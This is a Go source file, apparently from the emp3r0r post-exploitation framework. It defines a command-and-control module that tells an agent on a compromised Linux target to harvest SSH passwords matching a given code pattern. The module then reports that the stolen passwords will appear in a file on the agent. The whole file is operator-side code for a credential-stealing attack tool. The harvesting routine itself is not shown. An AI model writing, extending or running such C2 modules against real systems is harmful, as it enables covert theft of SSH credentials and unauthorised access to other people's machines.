//go:build linux
// +build linux

package cc

import (
	"fmt"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

func module_ssh_harvester() {
	if CurrentTarget == nil {
		LogError("CurrentTarget is nil")
		return
	}
	code_pattern_opt, ok := CurrentModuleOptions["code_pattern"]
	if !ok {
		LogError("code_pattern not specified")
		return
	}
	err := SendCmdToCurrentTarget(fmt.Sprintf("%s --code_pattern %s", emp3r0r_def.C2CmdSSHHarvester, code_pattern_opt.Val), "")
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
	LogMsg("Passwords will show up in the file path given by agent")
}
